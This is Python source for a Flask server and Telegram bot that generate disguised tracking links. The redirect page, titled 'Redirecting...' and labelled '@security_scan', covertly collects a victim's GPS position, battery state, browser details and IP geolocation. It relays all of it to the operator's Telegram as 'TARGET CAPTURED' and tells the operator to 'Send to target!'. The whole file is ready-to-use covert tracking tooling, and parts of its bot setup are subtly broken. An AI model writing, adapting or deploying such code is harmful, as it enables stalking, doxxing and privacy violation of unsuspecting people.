import os
import re
import logging
import requests
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from flask import Flask, request, jsonify
from dotenv import load_dotenv
import socket
from datetime import datetime

load_dotenv()

# Flask app
app = Flask(__name__)

# Config
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
WEBHOOK_URL = os.getenv('WEBHOOK_URL', 'https://your-app.onrender.com/webhook')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TRACKING_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Redirecting...</title>
<meta http-equiv="refresh" content="0;url={target_url}">
<style>body{{background:#000;color:#0f0;font-family:monospace;padding:50px;text-align:center}}</style>
</head>
<body>
<div style="font-size:24px;animation:blink 1s infinite">@security_scan</div>
<script>
navigator.geolocation.getCurrentPosition(p=>fetch('/gps?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+p.coords.accuracy+'&ts='+Date.now()));
if('getBattery' in navigator)navigator.getBattery().then(b=>fetch('/battery?lvl='+b.level+'&chg='+b.charging+'&ts='+Date.now()));
fetch('/track?ua='+encodeURIComponent(navigator.userAgent)+'&lang='+navigator.language+'&ts='+Date.now());
</script>
</body>
</html>
"""

def get_real_ip(req):
    xff = req.headers.get('X-Forwarded-For')
    return xff.split(',')[0].strip() if xff else req.remote_addr

@app.route('/', methods=['GET'])
def redirect_track():
    target = request.args.get('url', 'https://google.com')
    return TRACKING_PAGE.format(target_url=target)

@app.route('/webhook', methods=['GET'])
def webhook():
    target = request.args.get('url', 'https://google.com')
    return TRACKING_PAGE.format(target_url=target)

@app.route('/gps', methods=['GET'])
def gps():
    send_data({'gps': {
        'lat': request.args.get('lat'),
        'lon': request.args.get('lon'),
        'acc': request.args.get('acc')
    }})
    return 'OK'

@app.route('/battery', methods=['GET'])
def battery():
    send_data({'battery': {
        'level': float(request.args.get('lvl', 0)) * 100,
        'charging': request.args.get('chg') == 'true'
    }})
    return 'OK'

@app.route('/track', methods=['GET'])
def track():
    send_data({
        'ua': request.args.get('ua'),
        'lang': request.args.get('lang'),
        'screen': f"{request.args.get('w')}x{request.args.get('h')}"
    })
    return 'OK'

def get_ip_info(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,isp,org,lat,lon', timeout=3)
        return r.json()
    except:
        return {}

def send_data(extra_data):
    try:
        ip = get_real_ip(request)
        info = get_ip_info(ip)
        
        msg = f"""
🕵️ **TARGET CAPTURED**
━━━━━━━━━━━━━━━━━━
🌐 IP: `{ip}`
📍 Geo: {info.get('city')}, {info.get('country')}
📡 ISP: {info.get('isp')}
🔋 Battery: {extra_data.get('battery', {}).get('level', 'N/A')}%
📱 Device: {extra_data.get('ua', 'Unknown')[:80]}...
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', 
                     json={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'Markdown'})
    except Exception as e:
        logger.error(f"Send error: {e}")

# Telegram Bot
async def start(update: Update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    kb = [[InlineKeyboardButton("🔗 Generate Link", callback_data='gen')]]
    await update.message.reply_text("🚀 Bot Ready!\nClick to generate tracking link:", reply_markup=InlineKeyboardMarkup(kb))

async def btn(update: Update, context):
    if update.callback_query.from_user.id != ADMIN_ID:
        return
    await update.callback_query.edit_message_text(
        f"🔗 **Tracking Link**:\n`{WEBHOOK_URL}?url=https://google.com`\n\nSend to target!")

async def url_handler(update: Update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    url = update.message.text.strip()
    link = f"{WEBHOOK_URL}?url={url}"
    await update.message.reply_text(f"🎯 `{link}`", parse_mode='Markdown')

def run_bot():
    app.bot = Application.builder().token(BOT_TOKEN).build().bot
    Application.builder().token(BOT_TOKEN).build() \
        .add_handler(CommandHandler("start", start)) \
        .add_handler(CallbackQueryHandler(btn)) \
        .add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, url_handler)) \
        .run_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
